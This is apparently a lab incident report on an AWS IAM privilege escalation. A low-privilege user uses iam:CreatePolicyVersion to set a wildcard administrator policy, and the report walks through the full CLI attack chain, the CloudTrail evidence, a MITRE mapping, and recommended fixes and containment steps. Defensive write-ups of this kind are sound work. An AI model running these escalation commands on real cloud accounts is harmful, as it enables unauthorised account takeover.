# Incident Report 001 — AWS IAM Privilege Escalation

## Incident Summary
| Field | Detail |
|-------|--------|
| Date | 2026-06-20 |
| Time | 07:29:36 UTC |
| Severity | Critical |
| Type | Cloud Privilege Escalation |
| Affected Account | 063418083024 |
| Compromised Identity | lab-lowpriv-user |
| Source IP | 106.192.69.191 |
| Status | Detected and Investigated |

## Summary
A low privilege IAM user with a misconfigured permission set 
exploited the `iam:CreatePolicyVersion` action to rewrite their 
own policy and grant themselves full administrator access across 
the AWS account. The full attack chain was captured in AWS 
CloudTrail and reconstructed during investigation.

## Initial Access
The user `lab-lowpriv-user` was provisioned with console and 
programmatic access along with a custom policy intended to allow 
limited IAM read access. The policy inadvertently included 
`iam:CreatePolicyVersion`, a known privilege escalation vector.

## Attack Chain

### Step 1 — Reconnaissance
    aws sts get-caller-identity

Confirmed the attacker's identity and account context.

### Step 2 — Policy Enumeration
    aws iam list-policies --scope Local

Identified customer managed policies available in the account. 
Only one policy was discoverable — the attacker's own.

### Step 3 — Policy Inspection
    aws iam get-policy --policy-arn 
    arn:aws:iam::063418083024:policy/lab-vulnerable-policy

Confirmed the current default version of the target policy.

### Step 4 — Privilege Escalation
    aws iam create-policy-version \
      --policy-arn arn:aws:iam::063418083024:policy/lab-vulnerable-policy \
      --policy-document file:///tmp/admin-policy.json \
      --set-as-default

A new policy version was created granting full administrator 
access (`"Action": "*"`, `"Resource": "*"`) and immediately set 
as the default version, replacing the original limited permissions.

### Step 5 — Verification
    aws s3 ls
    aws iam list-users

Both commands succeeded, confirming the escalation to full 
administrator access was effective.

## Evidence from CloudTrail

### Full Attack Timeline
| Time UTC | Event | Source |
|----------|-------|--------|
| 07:26:30 | GetCallerIdentity | sts.amazonaws.com |
| 07:27:31 | ListPolicies | iam.amazonaws.com |
| 07:28:30 | GetPolicy | iam.amazonaws.com |
| 07:29:36 | CreatePolicyVersion | iam.amazonaws.com |
| 07:30:29 | ListBuckets | s3.amazonaws.com |
| 07:30:43 | ListUsers | iam.amazonaws.com |

### Critical Event — CreatePolicyVersion
    {
        "userIdentity": {
            "type": "IAMUser",
            "arn": "arn:aws:iam::063418083024:user/lab-lowpriv-user",
            "userName": "lab-lowpriv-user"
        },
        "eventTime": "2026-06-20T07:29:36Z",
        "eventName": "CreatePolicyVersion",
        "sourceIPAddress": "106.192.69.191",
        "userAgent": "aws-cli/2.35.9 ... command#iam.create-policy-version",
        "requestParameters": {
            "policyArn": "arn:aws:iam::063418083024:policy/lab-vulnerable-policy",
            "policyDocument": "{ \"Version\": \"2012-10-17\", 
                \"Statement\": [{ \"Effect\": \"Allow\", 
                \"Action\": \"*\", \"Resource\": \"*\" }] }",
            "setAsDefault": true
        },
        "readOnly": false
    }

This single CloudTrail event is conclusive evidence of the 
privilege escalation. The `readOnly: false` flag combined with 
the full wildcard policy document and `setAsDefault: true` 
confirms a deliberate state changing privilege escalation action.

## Impact Assessment

| Area | Impact |
|------|--------|
| Confidentiality | Critical — full read access to all account resources |
| Integrity | Critical — full write access to all account resources |
| Availability | Critical — ability to delete or disrupt any resource |
| Account Control | Critical — effectively full administrator takeover |

## MITRE ATT&CK Cloud Matrix Mapping

| Technique | ID | Description |
|-----------|-----|--------------|
| Valid Accounts: Cloud Accounts | T1078.004 | Use of valid low privilege IAM credentials |
| Cloud Account Discovery | T1087.004 | ListUsers used to enumerate IAM users |
| Abuse Elevation Control Mechanism | T1548 | Policy version manipulation to escalate privileges |
| Create or Modify System Process | T1543 | Modification of IAM policy to grant persistent access |

## Root Cause
The IAM policy attached to `lab-lowpriv-user` included 
`iam:CreatePolicyVersion` without restricting which policies it 
could be applied to. Because the action targeted the user's own 
attached policy, this allowed direct self escalation.

## Recommendations
1. Remove `iam:CreatePolicyVersion` from all non-administrative 
   IAM policies
2. Apply IAM permission boundaries to prevent self escalation 
   even if a dangerous action is granted
3. Enable AWS Config rules to detect privilege escalation patterns
4. Create a GuardDuty or CloudWatch alert for `CreatePolicyVersion` 
   actions performed by non-administrative users
5. Apply least privilege principle — grant only specific resource 
   ARNs instead of wildcard resources
6. Enable MFA enforcement for all IAM users with any IAM 
   permissions
7. Regularly audit IAM policies for known privilege escalation 
   patterns using tools such as PMapper or Cloudsplaining

## Containment Steps Taken
    ## Containment Steps Taken

Reverted policy to original safe version:

    aws iam set-default-policy-version \
      --policy-arn arn:aws:iam::063418083024:policy/lab-vulnerable-policy \
      --version-id v1 --profile admin

Deleted the malicious policy version:

    aws iam delete-policy-version \
      --policy-arn arn:aws:iam::063418083024:policy/lab-vulnerable-policy \
      --version-id v2 --profile admin

Fully detached the vulnerable policy from the compromised user:

    aws iam detach-user-policy \
      --user-name lab-lowpriv-user \
      --policy-arn arn:aws:iam::063418083024:policy/lab-vulnerable-policy \
      --profile admin

**Verification:**

    aws iam list-attached-user-policies --user-name lab-lowpriv-user

Result: `{"AttachedPolicies": []}` — confirmed user has zero 
attached policies, fully contained.

## Lessons Learned
- A single overly permissive IAM action can lead to full account 
  compromise within minutes
- CloudTrail captured the complete attack chain with enough detail 
  to fully reconstruct the incident without any additional tooling
- IAM policy auditing must specifically check for privilege 
  escalation primitives, not just obviously dangerous actions like 
  AdministratorAccess
- This technique requires no exploitation of AWS itself — only a 
  misconfiguration of customer managed policies, making it 
  entirely preventable through proper policy review
